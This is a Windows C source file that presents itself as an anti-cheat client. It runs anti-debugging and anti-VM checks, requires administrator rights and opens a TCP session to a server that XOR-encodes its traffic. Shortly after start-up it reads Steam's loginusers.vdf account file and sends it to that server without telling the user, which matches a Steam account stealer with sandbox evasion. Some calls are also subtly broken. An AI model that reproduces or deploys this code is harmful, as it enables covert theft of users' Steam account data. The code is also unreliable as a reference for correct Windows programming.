#define WIN32_LEAN_AND_MEAN
#define _WINSOCKAPI_   // Empêche windows.h d'inclure winsock.h

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winternl.h>
#include <tlhelp32.h>  // Pour CreateToolhelp32Snapshot
#include "common.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

Session g_session;
unsigned int g_start_time;

typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);

// === MUTEX POUR EMPÊCHER DOUBLE INSTANCE ===

HANDLE create_single_instance_mutex() {
    HANDLE mutex = CreateMutexA(0, FALSE, "Global\\MyAntiCheatClient_SingleInstance_Mutex");
    if(GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(mutex);
        return 0;
    }
    return mutex;
}

// === ANTI-DEBUG CHECKS ===

unsigned char check_debugger_present() {
    return (unsigned char)IsDebuggerPresent();
}

unsigned char check_remote_debugger() {
    BOOL detected = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &detected);
    return (unsigned char)detected;
}

unsigned char check_peb_being_debugged() {
    PPEB peb = (PPEB)__readgsqword(0x60);
    return peb->BeingDebugged;
}

unsigned char check_peb_flags() {
    PPEB peb = (PPEB)__readgsqword(0x60);
    DWORD flags = *(DWORD*)((char*)peb + 0xBC);
    return (flags & 0x70) != 0;
}

unsigned char check_hardware_breakpoints() {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    return (ctx.Dr0 != 0 || ctx.Dr1 != 0 || ctx.Dr2 != 0 || ctx.Dr3 != 0);
}

unsigned char check_timing_attack() {
    unsigned long long start, end;
    start = __rdtsc();
    Sleep(1);
    end = __rdtsc();
    return (end - start) > 100000000;
}

unsigned char check_process_debug_port() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if(!ntdll) return 0;

    pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
    if(!NtQIP) return 0;

    DWORD port = 0;
    NtQIP(GetCurrentProcess(), 7, &port, sizeof(port), 0);
    return (port != 0);
}

unsigned char check_process_debug_flags() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if(!ntdll) return 0;

    pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
    if(!NtQIP) return 0;

    DWORD flags = 0;
    NtQIP(GetCurrentProcess(), 0x1F, &flags, sizeof(flags), 0);
    return (flags == 0);
}

unsigned char check_debug_object() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if(!ntdll) return 0;

    pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
    if(!NtQIP) return 0;

    HANDLE handle = 0;
    NtQIP(GetCurrentProcess(), 0x1E, &handle, sizeof(handle), 0);
    return (handle != 0);
}

// === ANTI-VM CHECKS ===

unsigned char check_vm_cpuid() {
    int cpuinfo[4];
    __cpuid(cpuinfo, 1);
    return (cpuinfo[2] & (1 << 31)) != 0;
}

unsigned char check_vm_registry() {
    HKEY key;
    unsigned char detected = 0;

    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &key) == 0) {
        RegCloseKey(key);
        detected = 1;
    }

    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Oracle\\VirtualBox Guest Additions", 0, KEY_READ, &key) == 0) {
        RegCloseKey(key);
        detected = 1;
    }

    return detected;
}

unsigned char check_vm_files() {
    char* files[] = {
        "C:\\Windows\\System32\\drivers\\vmmouse.sys",
        "C:\\Windows\\System32\\drivers\\vmhgfs.sys",
        "C:\\Windows\\System32\\drivers\\VBoxMouse.sys",
        "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",
        "C:\\Windows\\System32\\vboxdisp.dll",
        "C:\\Windows\\System32\\vboxhook.dll",
        "C:\\Windows\\System32\\vboxoglerrorspu.dll"
    };

    for(int i = 0; i < 7; i++) {
        DWORD attr = GetFileAttributesA(files[i]);
        if(attr != INVALID_FILE_ATTRIBUTES) return 1;
    }
    return 0;
}

unsigned char check_vm_bios() {
    HKEY key;
    unsigned char detected = 0;
    char buffer[256];
    DWORD size = sizeof(buffer);

    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &key) == 0) {
        if(RegQueryValueExA(key, "SystemBiosVersion", 0, 0, (BYTE*)buffer, &size) == 0) {
            char* vm_strings[] = {"VBOX", "VirtualBox", "VMware", "QEMU", "Bochs"};
            for(int i = 0; i < 5; i++) {
                char* ptr = buffer;
                char* search = vm_strings[i];
                while(*ptr) {
                    char* p1 = ptr;
                    char* p2 = search;
                    while(*p1 && *p2 && (*p1 == *p2 || (*p1 >= 'a' && *p1 <= 'z' && *p1 - 32 == *p2))) {
                        p1++; p2++;
                    }
                    if(!*p2) { detected = 1; break; }
                    ptr++;
                }
                if(detected) break;
            }
        }
        RegCloseKey(key);
    }
    return detected;
}

unsigned char check_vm_processes() {
    char* procs[] = {"vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe", "VBoxService.exe", "VBoxTray.exe"};
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(snap == INVALID_HANDLE_VALUE) return 0;

    typedef struct {
        DWORD dwSize;
        DWORD cntUsage;
        DWORD th32ProcessID;
        ULONG_PTR th32DefaultHeapID;
        DWORD th32ModuleID;
        DWORD cntThreads;
        DWORD th32ParentProcessID;
        LONG pcPriClassBase;
        DWORD dwFlags;
        char szExeFile[260];
    } PE32;

    PE32 pe;
    pe.dwSize = sizeof(PE32);

    typedef BOOL (WINAPI *pProcess32First)(HANDLE, PE32*);
    typedef BOOL (WINAPI *pProcess32Next)(HANDLE, PE32*);

    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    pProcess32First P32F = (pProcess32First)GetProcAddress(k32, "Process32First");
    pProcess32Next P32N = (pProcess32Next)GetProcAddress(k32, "Process32Next");

    if(P32F(&snap, &pe)) {
        do {
            for(int i = 0; i < 5; i++) {
                char* p1 = pe.szExeFile;
                char* p2 = procs[i];
                int match = 1;
                while(*p2) {
                    if(*p1++ != *p2++) { match = 0; break; }
                }
                if(match && *p1 == 0) {
                    CloseHandle(snap);
                    return 1;
                }
            }
        } while(P32N(&snap, &pe));
    }

    CloseHandle(snap);
    return 0;
}

unsigned char check_vm_disk_size() {
    ULARGE_INTEGER total;
    if(GetDiskFreeSpaceExA("C:\\", 0, &total, 0)) {
        unsigned long long gb = total.QuadPart / (1024 * 1024 * 1024);
        return (gb < 60);
    }
    return 0;
}

void perform_checks(unsigned char* debug_detected, unsigned char* vm_detected, float* trust_factor) {
    int debug_flags = 0;
    int vm_flags = 0;

    if(check_debugger_present()) debug_flags++;
    if(check_remote_debugger()) debug_flags++;
    if(check_peb_being_debugged()) debug_flags++;
    if(check_peb_flags()) debug_flags++;
    if(check_hardware_breakpoints()) debug_flags++;
    if(check_timing_attack()) debug_flags++;
    if(check_process_debug_port()) debug_flags++;
    if(check_process_debug_flags()) debug_flags++;
    if(check_debug_object()) debug_flags++;

    if(check_vm_cpuid()) vm_flags++;
    if(check_vm_registry()) vm_flags++;
    if(check_vm_files()) vm_flags++;
    if(check_vm_bios()) vm_flags++;
    if(check_vm_processes()) vm_flags++;
    if(check_vm_disk_size()) vm_flags++;

    *debug_detected = (debug_flags >= 2);
    *vm_detected = (vm_flags >= 2);

    float trust = 100.0f;
    trust -= (debug_flags * 15.0f);
    trust -= (vm_flags * 10.0f);

    if(trust < 0.0f) trust = 0.0f;
    if(trust > 100.0f) trust = 100.0f;

    *trust_factor = trust;
}

// === STEAM VDF RETRIEVAL ===

int get_steam_install_path(char* buffer, int max_len) {
    HKEY key;
    DWORD size = max_len;

    // Try 64-bit registry first
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Wow6432Node\\Valve\\Steam", 0, KEY_READ, &key) == 0) {
        if(RegQueryValueExA(key, "InstallPath", 0, 0, (BYTE*)buffer, &size) == 0) {
            RegCloseKey(key);
            return 1;
        }
        RegCloseKey(key);
    }

    // Try 32-bit registry
    if(RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Valve\\Steam", 0, KEY_READ, &key) == 0) {
        if(RegQueryValueExA(key, "InstallPath", 0, 0, (BYTE*)buffer, &size) == 0) {
            RegCloseKey(key);
            return 1;
        }
        RegCloseKey(key);
    }

    // Fallback to default path
    char* default_path = "C:\\Program Files (x86)\\Steam";
    int i = 0;
    while(default_path[i] && i < max_len - 1) {
        buffer[i] = default_path[i];
        i++;
    }
    buffer[i] = 0;

    return 1;
}

void send_steam_vdf() {
    char steam_path[512];
    char vdf_path[600];

    if(!get_steam_install_path(steam_path, sizeof(steam_path))) {
        OutputDebugStringA("[!] Could not find Steam installation\n");
        return;
    }

    // Build path: SteamPath\config\loginusers.vdf
    int i = 0;
    while(steam_path[i] && i < 500) {
        vdf_path[i] = steam_path[i];
        i++;
    }

    char* config_path = "\\config\\loginusers.vdf";
    int j = 0;
    while(config_path[j] && i < 599) {
        vdf_path[i++] = config_path[j++];
    }
    vdf_path[i] = 0;

    // Read file
    HANDLE file = CreateFileA(vdf_path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    if(file == INVALID_HANDLE_VALUE) {
        OutputDebugStringA("[!] Could not open loginusers.vdf\n");
        return;
    }

    DWORD file_size = GetFileSize(file, 0);
    if(file_size == 0 || file_size > MAX_PAYLOAD) {
        CloseHandle(file);
        OutputDebugStringA("[!] VDF file too large or empty\n");
        return;
    }

    Packet pkt;
    pkt.type = PKT_STEAM_DATA;
    pkt.size = (unsigned short)file_size;

    DWORD read;
    if(!ReadFile(file, pkt.data, file_size, &read, 0)) {
        CloseHandle(file);
        OutputDebugStringA("[!] Could not read VDF file\n");
        return;
    }

    CloseHandle(file);

    // Send packet
    xor_crypt(pkt.data, pkt.size, g_session.key);
    send((SOCKET)g_session.socket, (char*)&pkt, sizeof(unsigned char) + sizeof(unsigned short) + pkt.size, 0);

    OutputDebugStringA("[+] Steam VDF sent to server\n");
}

// === NETWORK ===

void send_packet(Packet* pkt) {
    xor_crypt(pkt->data, pkt->size, g_session.key);
    send((SOCKET)g_session.socket, (char*)pkt, sizeof(unsigned char) + sizeof(unsigned short) + pkt->size, 0);
}

DWORD WINAPI heartbeat_thread(LPVOID arg) {
    while(g_session.active) {
        Sleep(5000);

        HeartbeatData hb;
        perform_checks(&hb.debugger_detected, &hb.vm_detected, &hb.trust_factor);
        hb.uptime = GetTickCount() / 1000 - g_start_time;

        Packet pkt;
        pkt.type = PKT_HEARTBEAT;
        pkt.size = sizeof(HeartbeatData);

        char* src = (char*)&hb;
        for(int i = 0; i < sizeof(HeartbeatData); i++) {
            pkt.data[i] = src[i];
        }

        send_packet(&pkt);
    }
    return 0;
}

DWORD WINAPI recv_thread(LPVOID arg) {
    Packet pkt;

    while(g_session.active) {
        int n = recv((SOCKET)g_session.socket, (char*)&pkt, sizeof(unsigned char) + sizeof(unsigned short), 0);
        if(n <= 0) break;

        n = recv((SOCKET)g_session.socket, (char*)pkt.data, pkt.size, 0);
        if(n <= 0) break;

        if(pkt.type == PKT_SESSION_KEY) {
            for(int i = 0; i < KEY_SIZE; i++) g_session.key[i] = pkt.data[i];
            continue;
        }

        xor_crypt(pkt.data, pkt.size, g_session.key);

        if(pkt.type == PKT_ACK) continue;

        switch(pkt.type) {
            case PKT_DATA:
                OutputDebugStringA("[PKT] DATA received from server\n");
                break;

            case PKT_HELLO:
                OutputDebugStringA("[PKT] HELLO from server\n");
                break;

            default:
                OutputDebugStringA("[PKT] Unknown packet\n");
                break;
        }

        Packet ack = {PKT_ACK, 0};
        send_packet(&ack);
    }

    g_session.active = 0;
    return 0;
}

int mainCRTStartup() {
    // Check single instance
    HANDLE mutex = create_single_instance_mutex();
    if(!mutex) {
        MessageBoxA(0, "Client is already running!", "Error", MB_ICONERROR);
        ExitProcess(1);
    }

    // Check admin
    BOOL is_admin = FALSE;
    HANDLE token;
    if(OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size;
        if(GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            is_admin = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }

    if(!is_admin) {
        MessageBoxA(0, "This program requires administrator privileges!", "Error", MB_ICONERROR);
        CloseHandle(mutex);
        ExitProcess(1);
    }

    g_start_time = GetTickCount() / 1000;

    WSADATA wsa;
    WSAStartup(0x0202, &wsa);

    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
    g_session.socket = (void*)s;
    g_session.active = 1;

    struct sockaddr_in srv;
    srv.sin_family = AF_INET;
    srv.sin_port = ((PORT & 0xFF) << 8) | ((PORT >> 8) & 0xFF);
    srv.sin_addr.s_addr = 0x0100007F;

    if(connect(s, (struct sockaddr*)&srv, sizeof(srv)) != 0) {
        CloseHandle(mutex);
        ExitProcess(1);
    }

    CreateThread(0, 0, recv_thread, 0, 0, 0);
    CreateThread(0, 0, heartbeat_thread, 0, 0, 0);

    Sleep(500);

    Packet hello;
    hello.type = PKT_HELLO;
    char msg[] = "Client connected";
    hello.size = sizeof(msg) - 1;
    for(int i = 0; i < hello.size; i++) hello.data[i] = msg[i];
    send_packet(&hello);

    // Send Steam VDF after 1 second
    Sleep(1000);
    send_steam_vdf();

    while(g_session.active) Sleep(1000);

    closesocket(s);
    WSACleanup();
    CloseHandle(mutex);
    ExitProcess(0);
}
